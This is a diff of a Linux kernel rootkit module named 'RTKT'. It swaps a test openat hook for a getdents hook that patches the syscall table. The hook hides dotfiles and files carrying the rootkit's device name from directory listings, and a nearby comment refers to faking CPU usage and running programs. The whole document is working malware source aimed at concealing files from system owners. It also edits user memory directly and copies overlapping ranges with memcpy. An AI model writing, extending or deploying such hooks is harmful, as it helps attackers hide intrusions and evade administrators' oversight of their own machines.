@@ -5,11 +5,42 @@ MODULE_AUTHOR("LS");
 MODULE_DESCRIPTION("RTKT");
 MODULE_VERSION("0.01");
 
+struct linux_dirent {
+	unsigned long	d_ino;
+	unsigned long	d_off;
+	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
+	char		d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
+};
+
 //Test fakeRead
-static asmlinkage long fakeOpenat(int fd, char __user *buf, size_t count) {
-	printk("we have succesfully intecepted a read!\n");
-	return orig_Openat(fd, buf, count);
+static asmlinkage int fakegetdents(int fd, struct linux_dirent __user *dirp, unsigned int count) {
+
+	int iterEnts; //buffer offset
+	struct linux_dirent *entry;
+	char *dentBuf; //buf holding dir entries
+	long ret = orig_getdents(fd, dirp, count); //get # of iterable entries
+
+	if(ret <= 0) {//error
+		return ret;
 	}
+	
+	dentBuf = (char *)dirp; 
+	for(iterEnts = 0; iterEnts < ret;) { //go through all entry names
+		entry = (struct linux_dirent *)(dentBuf + iterEnts); //get each entry
+		
+		//we will hide '.' files and rtkt name files
+		if((strncmp(entry->d_name, ".", 1) == 0) ||
+		  strstr(entry->d_name, DEVICE_NAME) != NULL) {
+			memcpy(dentBuf + iterEnts, dentBuf + iterEnts + entry->d_reclen, ret - (iterEnts + entry->d_reclen)); //copy non hidden files forwards
+			ret-= entry->d_reclen;
+			
+		}
+		else {
+			iterEnts += entry->d_reclen;
+		}
+	}
+	return ret; //return # entries found
+}
 
 static struct file_operations file_ops
 = {
@@ -188,8 +219,8 @@ static ssize_t device_write(struct file *filp,
 			}
 
 			//save old read
-			orig_Openat = (typeof(sys_read) *)syscall_table[__NR_openat];
-			CRO_WRITE_UNLOCK({ syscall_table[__NR_openat] = (void *)&fakeOpenat; });
+			orig_getdents= (typeof(sys_getdents) *)syscall_table[__NR_getdents];
+			CRO_WRITE_UNLOCK({ syscall_table[__NR_getdents] = (void *)&fakegetdents; });
 			break;
 			}
 		case 4: //Fake CPU usage and programs running 
